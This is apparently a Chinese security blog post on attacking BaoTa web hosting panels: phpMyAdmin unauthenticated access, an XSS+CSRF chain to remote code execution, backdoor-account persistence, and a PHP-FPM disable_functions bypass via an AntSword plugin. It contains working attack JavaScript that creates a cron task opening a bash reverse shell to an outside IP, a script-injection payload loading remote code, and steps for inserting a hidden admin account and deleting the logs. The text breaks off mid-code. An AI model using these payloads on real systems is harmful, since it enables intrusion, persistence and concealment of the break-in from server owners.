#  宝塔渗透手法总结，从常见漏洞 聊到 宝塔维权 再到 bypass disable_functions原理   
 Z2O安全攻防   2024-01-07 21:02  
  
各位读者，好久不见，这段时间麋鹿甚是繁忙，以致于有一段时间未更新技术文章了。这几日看朋友圈中多位同仁分享雪景，突然发现已岁寒时深，恰巧又遇上流感，  
早晚清寒，大家记得勤添衣，望各位勿病安好。  
  
  
零-文章目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuIZhT4Hqicn1AwTxKl6lQJhiauZibiaALNlYK3Inw1PQibXBUwpZ8ecvk40UmicHDxOuJwe4v5IicjiamyTQ1HvYcm9WQ/640?wx_fmt=png "")  
  
  
<table><tbody><tr><td width="268" valign="top" style="word-break: break-all;">宝塔常见漏洞<br/></td><td width="268" valign="top" style="word-break: break-all;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">phpmyadmin未授权</span></td></tr><tr><td width="268" valign="top"><br/></td><td width="268" valign="top" style="word-break: break-all;">宝塔xss+csrf RCE<br/></td></tr><tr><td width="268" valign="top" style="word-break: break-all;">宝塔维权手法<br/></td><td width="268" valign="top" style="word-break: break-all;">添加后门账号<br/></td></tr><tr><td width="268" valign="top" style="word-break: break-all;">bypass <span style="letter-spacing: 0.578px;text-wrap: wrap;">disable_functions手</span>法<br/></td><td width="268" valign="top" style="word-break: break-all;">disable_functions and FastCGI/PHP_FPM前置知识<br/></td></tr><tr><td valign="top" colspan="1" rowspan="1"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;">bypass disable_functions原理和插件使用</td></tr><tr><td valign="top" colspan="1" rowspan="1"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;">bypass disable_functions插件代码分析</td></tr></tbody></table>  
  
壹-宝塔常见漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuIZhT4Hqicn1AwTxKl6lQJhiauZibiaALNlYK3Inw1PQibXBUwpZ8ecvk40UmicHDxOuJwe4v5IicjiamyTQ1HvYcm9WQ/640?wx_fmt=png "")  
  
  
  
**宝塔phpmyadmin未授权**  
  
**1.漏洞介绍**  
  
公网无需鉴权直接 root 权限进入 phpmyadmin，IP或域名地址：888/pma  
  
为什么要介绍这个洞呢，因为phpmyadmin这里好做文章，常见  
手法有  
into outfile写shell，日志get shell，UDF getshell，MOF提权，网上教程一大堆，这里麋鹿就不浪费大家时间了，不熟悉的读者可以百度一下  
  
**2.影响版本**  
  
宝塔Linux面板7.4.2版本  
  
宝塔Linux测试版7.5.13  
  
Windows面板6.8版本  
  
**3.复现流程**  
  
宝塔会自动升级，搭个环境还是有点浪费时间的，这里我推荐Timeline Sec团队Sky师傅制作的靶场（记得登录上去第一时间关闭宝塔的自动更新）  
```
https://cloud.tencent.com/developer/article/1693184
```  
  
复现也很简单  
  
如果能直接访问到下面地址就是存在该洞了  
```
http://ip:端口/pma
```  
  
  
**宝塔RCE**  
  
**1.漏洞介绍and影响版本**  
  
1.    6.x版本记录了验证码错误并存入数据库当中（老版本）  
  
2.    <7.9.3版本  
宝塔会记录网站nginx日志，后台查看日志的地方可以XSS  
  
**2.复现流程**  
  
麋鹿选择7.9版本，  
如果已经安装高版本宝塔，需要还原成低版本  
  
1，官网安装一个新版本，登录进去设置成离线  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5ur9Zb2RnWnwIn0uRN4v5OlYbS19mlxJxfyDBbG1AibfXaUMaQpJtSTibT3GXuicmmmq6U4mrLA87TwMQ/640?wx_fmt=png "")  
  
2.下载旧版本  
  
```
yum install curlcurl -L https://github.com/weiwang3056/baota_release/blob/main/LinuxPanel/LinuxPanel-7.7.0.zip?raw=true > LinuxPanel-7.7.0.zip
```  
  
  
3.解压  
  
```
unzip LinuxPanel-7.7.0.zip
```  
  
  
3.cd到panel目录执行更新脚本  
  
```
bash update.sh
```  
  
  
4.修改hosts防止官方更新  
  
```
echo '127.0.0.1 bt.cn' >>/etc/hosts
```  
  
  
ok，已经是旧版本了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5ur9Zb2RnWnwIn0uRN4v5OlYncibguUohjaVIfeC1NdQPbrKDRSkic4rjHKPzCBhSZRQtMUn53cK2KIw/640?wx_fmt=png "")  
  
5.随便创一个网站  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up8dAkQzRj2sEtbb90icl3Y4eGU1UNa4lF21GTPgIicuWX5BX3prWjWVcaSThZGCdqk0bO2rTxUr2Ow/640?wx_fmt=png "")  
  
6.UA里插一个xss弹窗  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up8dAkQzRj2sEtbb90icl3Y4Rib1WzdBwLliaweZrJEAEubTRmTOC21YOq6nUECwic14woj27vibLGBzDw/640?wx_fmt=png "")  
  
7.看日志，弹了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5up8dAkQzRj2sEtbb90icl3Y4KAK5MwNok99I0XQvWib7EH00SbHcltD2I85TNX4dgo93qYxWIQAicYow/640?wx_fmt=png "")  
  
8.xss+csrf  
  
开一个web服务，建一个js文件内容如下（记得把shell命令改成自己的ip和端口）  
  
```
function addTask(TaskName, execTime, ip, port) {
    var execShell = 'bash -i >& /dev/tcp/192.168.1.14/7777 0>&1';
    execShell = encodeURIComponent(execShell);

    var params = 'name=' + TaskName + '&type=minute-n&where1=' + execTime + '&hour=&minute=&week=&sType=toShell&sBody=' + execShell + '&sName=&backupTo=localhost&save=&urladdress=undefined';

    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/crontab?action=AddCrontab', false);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);
}

function execTask(TaskName) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/crontab?action=GetCrontab', true);
    xhr.send();

    xhr.onload = function () {
        if (this.readyState == 4 && this.status == 200) {
            var res = JSON.parse(this.responseText);

            if (res[0].name == TaskName) {
                var TaskID = res[0].id.toString();
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/crontab?action=StartTask', false);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                var params = 'id=' + TaskID;
                xhr.send(params);

                delTask(res[0].id);
                console.log(res[0].id);
                return res[0].id;
            }
        }
    }
}

function delTask(TaskID) {
    var params = 'id=' + TaskID.toString();
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/crontab?action=DelCrontab', false);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);
}

var TaskName = Math.random().toString(36).substring(7);
addTask(TaskName, '5', '1.1.1.1', '53');
execTask(TaskName);
```  
  
  
9.插入xss   
  
```
</textarea><script src=http://192.168.1.3:8080/1.js></script>
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZoncUQt86J9aBLRhOvl4nA24rNib6G7MsZhPDmLnFdGFT0T7foIICufoyQ/640?wx_fmt=png "")  
10.  
查看日志，成功触发csrf（不知道为啥这个图片这么模糊）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZoniaYoZK6nBU1cGrVJiar9nNrZTHMvJaWyianVhzLkALrzCmHoGlc2IGtcA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZon7TZibL9GaSas3BYeAic4BGJWcbELia3Fo6FxQa60TmFTVRGxkOv5XbsZw/640?wx_fmt=png "")  
  
ok，说完了宝塔常见的洞，现在来讲讲维权  
  
  
贰-宝塔维权手法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuIZhT4Hqicn1AwTxKl6lQJhiauZibiaALNlYK3Inw1PQibXBUwpZ8ecvk40UmicHDxOuJwe4v5IicjiamyTQ1HvYcm9WQ/640?wx_fmt=png "")  
  
  
  
**1.前置知识**  
  
宝塔面板登录的信息存储在  
/www/server/panel/data/default.db中，很明显是个sqlite3文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZonpEFIuYOibkoB0XY0UBCaaXPJcia4ThFjIibuAOMUQOG7sAP0R2VI8l8LQ/640?wx_fmt=png "")  
  
（顺便提一句，上面其他.pl文件的作用  
  
开放端口对应port.pl  
  
后台地址对应admin_path.pl  
  
宝塔默认登录密码:对应default.pl）  
  
其中账号密码存在users表中，对于password的加密方式为  
  
**md5(md5(md5(password)+'_bt.cn')+salt)**  
  
其中password为明文密码，salt在users中的salt字段  
  
现在用DB Browser for SQLite看一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZonicf0gAgbAtXZJibd4SS5jz1cQF23TIFicf8jVDd3m3gWhU7vNWrdMiadpw/640?wx_fmt=png "")  
  
很明显salt为3D3cJrSqoSec，那我们尝试加密一下看看最终的值是否正确  
  
```
# MD5 hashing with additional strings as per the provided pattern
original_text = "milu1234"
additional_string1 = "_bt.cn"
additional_string2 = "3D3cJrSqoSec"

# First MD5 hash
first_md5 = hashlib.md5(original_text.encode()).hexdigest()

# Second MD5 hash with additional string 1
second_md5 = hashlib.md5((first_md5 + additional_string1).encode()).hexdigest()

# Final MD5 hash with additional string 2
final_md5 = hashlib.md5((second_md5 + additional_string2).encode()).hexdigest()
final_md5
```  
  
  
最终的 MD5 哈希值是 5bc8301dff105f3a6f6a7a0866d0420f。  
  
用上面代码得到的 MD5 哈希值是 5bc8301dff105f3a6f6a7a0866d0420f  
，和表中结果一样，那么我们现在添加一个后门账号，账号名为admin，密码为123456，salt还是上面的3D3cJrSqoSec，用上面的脚本得到加密  
结果是4f4e1bf65ece412cf33ffb87fad3cd24  
。把这个加入到users表里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZonhUxAG5KktgEAxSBQmRtH7JfMJHjic6XiaSxyrqxpjXE1EZefMBqkWicgw/640?wx_fmt=png "")  
  
尝试登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZonfb3lyHqRibzBvCd1X7kCaraPxfFgVkB9QTm5IRFxPTRCJ0NZtNwjUZQ/640?wx_fmt=png "")  
  
进来了，对了，记得删日志，记录在  
default.db的log表里  
  
ok，现在开始今天的硬菜--bypass   
disable_functions  
  
  
  
叁-  
disable_functions and **FastCGI/PHP_FPM前置知识**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuIZhT4Hqicn1AwTxKl6lQJhiauZibiaALNlYK3Inw1PQibXBUwpZ8ecvk40UmicHDxOuJwe4v5IicjiamyTQ1HvYcm9WQ/640?wx_fmt=png "")  
  
  
  
**1.disable_functions是什么**  
  
disable_functions是php.ini中的一个设置，就是一些危险的命令执行函数的黑名单。而宝塔会默认开  
disable_functions，这就会造成拿到webshell以后无法执行命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoHVAvP6EMQlSqPeHUxUZonEvQ73zzePWu3icpYYqXtn7mQYAQnRvuWRvHXl0vQoa3K8pNT4qF5TEA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KergXyfhbFQYyDficYmhicS2jobh9BoDziaCGZ7UWxgic6ahmfRuHuuBDd9Fg/640?wx_fmt=png "")  
  
如何绕过?  
  
之前麋鹿就发过一篇**LD_PRELOAD**的文章  
```
https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484214&idx=1&sn=0c00e6110d43ba82ac62296f808a119c&chksm=c0e63829f791b13f6561923d93725d070c0a0d27c48454d7fae47029d4e07596895421a0e47c&token=1554332763&lang=zh_CN#rd
```  
  
今天再来说一下**FastCGI/PHP_FPM**的思路  
  
首先，为什么要说这个东西呢，因为**宝塔在安装php的时候默认安装PHP_FPM****，**如下图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerJ93mnJNGYDjb3bIsWa3UTXyBK7qc9k72BDvHrK24KVltic7GQHbBkqA/640?wx_fmt=png "")  
  
  
**2.FastCGI/PHP_FPM的前世今生**  
  
  
由来：PHP 最初是以模块形式运行在 Web 服务器上的，比如 Apache 的 mod_php。这种方式简单易用，但在高负载情况下性能不佳。为了解决这一问题，引入了 FastCGI 模式，PHP 通过 FastCGI 与 Web 服务器通信。  
  
发展：PHP-FPM 是 FastCGI 的一个实现，它提供了更好的**进程管理**能力。它最早作为一个独立的项目出现，用于补充 PHP 核心中缺失的功能。随着时间  
的发展，由于其出色的性能和稳定性，PHP-FPM 被整合到了 PHP 核心中，从 PHP 5.3.3 版本开始成为 PHP 的一部分。  
  
显而易见PHP-FPM 主要用于提高 PHP 应用程序的性能和稳定性。  
  
**3.FastCGI/PHP_FPM工作原理**  
  
1.与Web服务器分离  
：PHP-FPM 作为 FastCGI 的实现，与 Web 服务器（如 Nginx 或 Apache）**分离**。Web 服务器处理静态内容，而 PHP-FPM 负责处理动态 PHP 请求。  
  
2.请求处理：当 Web 服务器接收到一个 PHP 请求时，它将请求通过 FastCGI 传递给 PHP-FPM。  
  
3.进程管理：PHP-FPM 维护一个或多个子进程池。每个池可以有不同的配置，比如用户、进程数量和环境变量。  
  
4.响应请求：子进程处理请求并将结果返回给 Web 服务器，Web 服务器再将结果发送给客户端。  
  
5.动态调整：PHP-FPM 可以根据配置和服务器负载动态地调整子进程的数量。  
  
**FastCGI/PHP_FPM的特点**  
  
细心的读者可能注意到我在上面的介绍里加粗了几个关键词--和web服务器**分离运行** and 有**进程管理**功能，是的，这些就是bypass的部分原理，下面麋鹿具体说说特点。****  
1. 不同的执行环境：PHP-FPM 作为 FastCGI 进程管理器，与 Web 服务器（如 Nginx 或 Apache）分离运行。在某些配置和特定的环境下，PHP-FPM 可能会以不同的用户或权限组执行，这可能导致它对 PHP 配置文件（如 php.ini）的解释和应用不同于预期。  
  
1. 独立的子进程：PHP-FPM 管理多个子进程来处理 PHP 请求。每个子进程可以有自己的配置和环境变量。在某些情况下，特定的子进程可能不受主 php.ini 文件中 disable_functions 指令的影响。  
  
1. 配置细节：如果 PHP-FPM 配置不当，某些进程池可能会忽略或覆盖 php.ini 中的设置。例如，如果某个进程池有自己的 php.ini 文件或者通过 FPM 配置文件设置了特定参数，这些设置可能会绕过全局的 disable_functions 设置。  
  
  
**4.FastCGI/PHP_FPM工作流程**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KercoQN1ztXVs5mUPMuGxXH9gibqvoVym6Ymuw2WbmLjhGRQtkQ7Qnf6Og/640?wx_fmt=png "")  
1. 客户端请求：  
  
1. 流程开始于客户端（例如一个网页浏览器）向 Web 服务器发送请求，这个请求可能是对 PHP 文件的调用，如 www.example.com/index.php。  
  
1. Web 服务器接收请求：  
  
1. Web 服务器（如 Nginx）接收到对 PHP 文件的请求。  
  
1. 加载 FastCGI 模块：  
  
1. Nginx 会加载 FastCGI 模块，这是它用来处理 PHP 文件的工具。  
  
1. FastCGI 模块处理请求：  
  
1. FastCGI 模块将收到的 HTTP 请求转换为 FastCGI 协议的请求。这个过程包括封装 HTTP 请求信息，如 GET/POST 数据、Cookies 和其他头信息。  
  
1. 请求转发至 PHP-FPM：  
  
1. 封装好的 FastCGI 请求被发送到 PHP-FPM 服务。  
  
1. PHP-FPM 处理请求：  
  
1. PHP-FPM 接收到请求后，根据 FastCGI 协议解析并创建或分配一个子进程来处理请求。  
  
1. 子进程执行 PHP 脚本，生成响应内容。这可能包括执行数据库查询、处理数据、生成 HTML 等。  
  
1. 发送响应回 Web 服务器：  
  
1. 一旦 PHP 脚本处理完毕，生成了响应（通常是 HTML），PHP-FPM 会将这个响应通过 FastCGI 协议发送回 Web 服务器。  
  
1. Web 服务器返回响应给客户端：  
  
1. Web 服务器接收到 PHP-FPM 的响应后，将其转换为 HTTP 响应，并发送回客户端（浏览器）。  
  
1. 客户端显示内容：  
  
1. 浏览器接收到来自 Web 服务器的响应后，解析并显示内容，完成整个请求-响应周期。  
  
还是很好理解的，大家流程图和文字搭配理解（字丑见谅）  
  
**5.**  
fastcgi协议  
  
FastCGI 是一种常见的与 Web 服务器通信的协议，而FPM是Fastcgi的协议解析器。  
  
当我们请求一个网页时，Nginx 会将 HTTP 请求转换为FastCGI 参数，这些参数会作为键值对传递给 FastCGI 处理程序--PHP-FPM。这些参数基本上是 CGI变量，它们包括了请求的所有重要信息。  
### FastCGI 消息类型  
  
FastCGI 协议定义了多种消息类型，用于不同的操作，例如：  
- 开始请求（Begin Request）：初始化一个请求。  
  
- 终止请求（End Request）：结束一个请求。  
  
- 参数（Params）：发送请求参数，如 QUERY_STRING、REQUEST_METHOD 等。  
  
- 标准输入（Stdin）：发送请求主体，如 POST 数据。  
  
- 标准输出（Stdout）：发送响应内容。  
  
- 标准错误（Stderr）：发送错误信息。  
  
- 数据（Data）：发送额外的数据。  
  
举个例子，  
当访问 www.milu.com/milu.php  
 时，  
web目录为/www/wwwroot/www.milu.com，  
键值对如下  
- SCRIPT_FILENAME: /www/wwwroot/www.milu.com/milu.php  
  
- QUERY_STRING: 请求的查询字符串（如果有的话，如 ?id=123）  
  
- REQUEST_METHOD: 请求方法，例如 GET  
  
- DOCUMENT_ROOT: /www/wwwroot/www.milu.com  
  
- SCRIPT_NAME: /milu.php  
  
- REQUEST_URI: /milu.php 或者包含查询字符串的完整 URI  
  
- DOCUMENT_URI: /milu.php  
  
- SERVER_PROTOCOL: 使用的协议版本，如 HTTP/1.1  
  
- GATEWAY_INTERFACE: CGI 版本，通常是 CGI/1.1  
  
- SERVER_SOFTWARE: Web 服务器软件及其版本，如 nginx/1.18.0  
  
- REMOTE_ADDR: 客户端的 IP 地址  
  
- REMOTE_PORT: 客户端的端口  
  
- SERVER_ADDR: 服务器的 IP 地址  
  
- SERVER_PORT: Web 服务器监听的端口，通常是 80 或 443  
  
- SERVER_NAME: 服务器名，这里是 www.milu.com  
  
p神有一篇文章里面提到一个用  
SCRIPT_FILENAME进行代码执行的思路，如下  
> https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=1#reply-list  
  
  
  
但这个是以文件包含（包含  
SCRIPT_FILENAME值对应的文件）来进行执行，这个并不能bypass disable，因为这样还是会加载原先的php.ini，函数依然会被ban，那我们换一种思路：  
  
**如果我们生成一个我们自定义的so文件并上传到服务器，然后通过FPM加载这个so文件去创建一个web服务（这是通过设置 PHP 的环境变量PHP_VALUE 和 PHP_ADMIN_VALUE来实现的），这个新的服务忽略php.ini，也就是说这个新的web服务里没有ban掉危险函数，里面根本就不存在disabl****e functions了？然后我们把执行命令的流量转发到新的web服务上，那这样的话，我们不就能执行命令了？不久就bypass了吗？**  
  
ok，现在开始介绍上面的思路--也就是蚁剑bypass插件的原理****  
  
肆-bypass disable_functions原理和插件使用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuIZhT4Hqicn1AwTxKl6lQJhiauZibiaALNlYK3Inw1PQibXBUwpZ8ecvk40UmicHDxOuJwe4v5IicjiamyTQ1HvYcm9WQ/640?wx_fmt=png "")  
  
  
  
**再理一下思路**  
  
简单点来讲就是用PHP-FPM  
启动一个新WebServer，绕过了disable functions的检测  
  
此方法适用于PHP-FPM/FCGI 监听在 unix socket 或者 tcp socket 上时使用。常见的比如: nginx + fpm，而IIS+FPM 使用的是「管道」通信，故不适用。  
  
再来介绍一点刚才没聊到的**前置知识**  
  
1，php.ini里的  
extension  
是什么  
  
php.ini 文件中的 extension 指令用于加载自定义的 .so 文件，即自定义的 PHP 扩展。这使得我们可以为 PHP 添加额外的功能或集成第三方库。  
  
一般这样指定  
  
```
extension=/path/to/your/extension.so
```  
  
  
2，宝塔里PHP-FPM的位置在哪  
  
一般位于php/[版本号]/fpm/pool.d/  
 目录下，例如 php/7.4/fpm/pool.d/www.conf  
  
3.  
PHP-FPM 的配置文件中 listen 参数是什么  
  
listen  
 参数用于指定 PHP-FPM 监听的地址和端口或 Unix 套接字路径。这个参数决定了 Web 服务器（如 Nginx 或 Apache）如何与 PHP-FPM 进程通信。一般有两种形式  
  
一为 IP 地址和端口组合，例  
  
```
listen = 127.0.0.1:9000
```  
  
  
二为  
 Unix 套接字的路径，例  
  
```
listen = /tmp/php-cgi-74.sock
```  
  
  
宝塔默认为第二种，如下图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerS5r5LlAakXdXEhpqUqTyfPwqVCtm6PgaiaiaN6WRXuAoz53hkyFNeTzQ/640?wx_fmt=png "")  
  
4.那我再多说几句吧，  
listen = /tmp/php-cgi-74.sock这是啥意思呢  
  
这意味着 PHP-FPM 使用的是一个 Unix 套接字，而不是 TCP 端口。在这种情况下，PHP-FPM 不会监听一个具体的“端口”，而是通过文件系统上的这个套接字来接收来自 Web 服务器（如 Nginx 或 Apache）的连接请求。  
  
Unix 套接字（如/var/run/php/php7.4-fpm.sock  
）是一种通信机制，允许在同一台机器上运行的不同进程（例如 Web 服务器和 PHP-FPM 进程）之间进行数据交换。与 TCP/IP 端口不同，Unix 套接字不使用网络层进行通信，而是在操作系统的文件系统层面上进行，因此它们通常更高效且具有更低的延迟。  
  
ok，现在介绍一下蚁剑的这款插件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerUzJKudT6t6uCMm67phstWMuicQhqChP0Tk4kCbxxxwuxnEfalpn6Riaw/640?wx_fmt=png "")  
  
挂上代理就可以直接在插件市场里下载了  
  
**如何使用**  
1. 先写一个一句话，名字为1.php，蚁剑连一下，发现不能执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95Ker3LEDPPRBNewXMmTL5zPos0sM7WnhR1je64aWb61exfkVukbMsNqgibw/640?wx_fmt=png "")  
  
2.选中这个1.php，加载bypass插件  
  
（不知道为什么截图好模糊）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerDYFw7Pl3zhdbvNY37eFLpuxXQD74ZmM20pDTTldChOz8oweEGJJK0A/640?wx_fmt=png "")  
  
3.选择模式和选项。如下图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95Ker6ic5kmUg3VnicSo537lpRnWZiaEKtEtWicZFI6EMSzujXwagWMkia293dew/640?wx_fmt=png "")  
  
然后可以看到马子目录多了一个php和so文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95Kerlic8JPU2UeFIoyiav6oibCBMBcYe5WYWqbaMZicGZaWbrDZI0YVlS5urOA/640?wx_fmt=png "")  
  
4.再添加一个shell，就是刚才生成的.antproxy.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerHxicHKv5EHYMYcE82wXRYLfG2m1jLIYQSRsfrl0HiasiaXygT1Cdbicmicg/640?wx_fmt=png "")  
  
5.成功执行命令，bypass disable_fluctions  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95Ker28Jy1ss8iaiate65mT4quoQTOIUrJbg8kZrdNmxU5uzD88mYJXdMYH6Q/640?wx_fmt=png "")  
  
  
ok，插件通过FPM bypass的原理以及说的很清楚了，下面我们一起来看看是如何通过代码实现的  
  
  
伍-bypass disable_functions插件代码分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibuIZhT4Hqicn1AwTxKl6lQJhiauZibiaALNlYK3Inw1PQibXBUwpZ8ecvk40UmicHDxOuJwe4v5IicjiamyTQ1HvYcm9WQ/640?wx_fmt=png "")  
  
  
  
插件项目地址如下  
  
```
https://github.com/AntSword-Store/as_bypass_php_disable_functions
```  
  
  
先看一下  
core/php_fpm/index.js  
  
该js文件主要功能是和FPM通信，创建一个web server，和加载一个.so文件。我们来一个一个看这些功能对应的代码  
  
1，FPM功能  
  
```
// 导入 FastCGI 客户端，用于与 PHP-FPM 交互
const { FastCgiClient } = require('../../payload');
// PHP-FPM 连接配置
let fpm_host = '';
let fpm_port = -1;
formvals['fpm_addr'] = formvals['fpm_addr'].toLowerCase();
if (formvals['fpm_addr'].startsWith('unix:')) {
    fpm_host = formvals['fpm_addr'];
} else if (formvals['fpm_addr'].startsWith('/')) {
    fpm_host = `unix://${formvals['fpm_addr']}`
} else {
    fpm_host = formvals['fpm_addr'].split(':')[0] || '';
    fpm_port = parseInt(formvals['fpm_addr'].split(':')[1]) || 0;
}
// 构造 FastCGI 请求并发送到 PHP-FPM
var payload = `${FastCgiClient()};
$content="";
$client = new Client('${fpm_host}',${fpm_port});
$client->request(array(
    'PHP_VALUE' => 'extension=${p}',
    'PHP_ADMIN_VALUE' => 'extension=${p}',
    ),
    $content
);
sleep(1);
echo(1);
`;
```  
  
  
2.，生成.so文件并上传/core/base.js里  
  
生成ext的generateExt函数如下  
  
```
generateExt(cmd) {
    let self = this;
    let fileBuff = fs.readFileSync(self.ext_path);
    let start = 0,
      end = 0;
    switch (self.ext_name) {
      case 'ant_x86.so':
      case 'ant_x32.so':
        start = 275;
        end = 504;
        break;
      case 'ant_x64.so':
        // 434-665
        start = 434;
        end = 665;
        break;
      case 'ant_x86.dll':
      case 'ant_x32.dll':
        start = 1544;
        end = 1683;
        break;
      case 'ant_x64.dll':
        start = 1552;
        end = 1691;
        break;
      default:
        break;
    }
    if (cmd.length > (end - start)) {
      return
    }
    fileBuff[end] = 0;
    fileBuff.write(" ", start);
    fileBuff.write(cmd, start);
    return fileBuff;
  }
```  
  
  
linux下生成.so  
  
这里很有趣，ext里有对应的so和dll  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KersWickYoR3G3WmdMHfJurib1yd2wt4hhzf2kJclOxP1ialDYfLqotm2Rxw/640?wx_fmt=png "")  
  
而这些so和dll的内容也很有趣，用IDA反编译看一下so和dll的内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerNibLfxpRDnRxjYddicZhWxRIQogXdkc2ORy9hT6brjHvxmazCicX9Hlkw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5uoicWXUjXBjj4MF3ymX95KerpRS6kpko9VEqiadtQRfMqrOCVstov7fmNFnS8GZSknvx6aZXibWq5f4w/640?wx_fmt=png "")  
  
  
  
同时  
generateExt（）函数是这样调用的  
  
```
let cmd = `${phpbinary} -n -S 127.0.0.1:${port} -t ${webrootdir}`;
      let fileBuffer = self.generateExt(cmd);
```  
  
  
什么意思呢，就是直接把下面这条命令插到so或者dll里  
（写到cmd里）然后运行  
  
let cmd =   
${phpbinary} -n -S 127.0.0.1:${port} -t ${webrootdir}  
  
具体一点命令长这样（下面会详细介绍）  
  
```
/bin/sh -c php -n -S 127.0.0.1:60298-t /var/www/html
```  
  
  
先剧透一下，就是创建一个  
“裸”的php server  
  
具体一点来讲，**流程如下**  
  
使用 fs.readFileSync 方法读取 ext 路径下的文件（so or dll文件）到 fileBuff 中。  
  
将cmd命令插入到硬编码的起始和结束位置。  
  
检查cmd命令长度是否超过预留的区域，不超过在文件的指定位置写入命令（因为cmd命令是固定的，所以一般不会超过该长度，预留区域就是ida反编译里comand那一块空白的地方）。  
  
最后返回的文件包含原始的共享库内容和新插入的命令。  
  
3，上传.so  
  
```
// 上传 .so 文件
new Promise((res, rej) => {
    var ext_path = `${wdir}/.${String(Math.random()).substr(2, 5)}${self.ext_name}`;
    core.request(
        core.filemanager.upload_file({
            path: ext_path,
            content: fileBuffer
        })
    )
    // ... 后续 Promise 链
});
```  
  
  
4，加载上传的.so文件并发生fastcgi请求  
  
```
// 构造 FastCGI 请求并发送到 PHP-FPM
var payload = `${FastCgiClient()};
$content="";
$client = new Client('${fpm_host}',${fpm_port});
$client->request(array(
    'GATEWAY_INTERFACE' => 'FastCGI/1.0',
    'REQUEST_METHOD' => 'POST',
    'SERVER_SOFTWARE' => 'php/fcgiclient',
    'REMOTE_ADDR' => '127.0.0.1',
    'REMOTE_PORT' => '9984',
    'SERVER_ADDR' => '127.0.0.1',
    'SERVER_PORT' => '80',
    'SERVER_NAME' => 'mag-tured',
    'SERVER_PROTOCOL' => 'HTTP/1.1',
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
    'PHP_VALUE' => 'extension=${p}',
    'PHP_ADMIN_VALUE' => 'extension=${p}',
    'CONTENT_LENGTH' => strlen($content)
    ),
    $content
);
```  
  
  
5.和新的web服务通讯  
  
```
exploit() {
    // ... [代码省略] ...
    new Promise((res, rej) => {
        // ... [代码省略] ...
    }).then((p) => {
        // 触发 payload, 会超时
        var payload = `${FastCgiClient()};
          $content="";
          $client = new Client('${fpm_host}',${fpm_port});
          $client->request(array(
            // FastCGI 请求参数
            'GATEWAY_INTERFACE' => 'FastCGI/1.0',
            'REQUEST_METHOD' => 'POST',
            'SERVER_SOFTWARE' => 'php/fcgiclient',
            'REMOTE_ADDR' => '127.0.0.1',
            'REMOTE_PORT' => '9984',
            'SERVER_ADDR' => '127.0.0.1',
            'SERVER_PORT' => '80',
            'SERVER_NAME' => 'mag-tured',
            'SERVER_PROTOCOL' => 'HTTP/1.1',
            'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
            'PHP_VALUE' => 'extension=${p}',
            'PHP_ADMIN_VALUE' => 'extension=${p}',
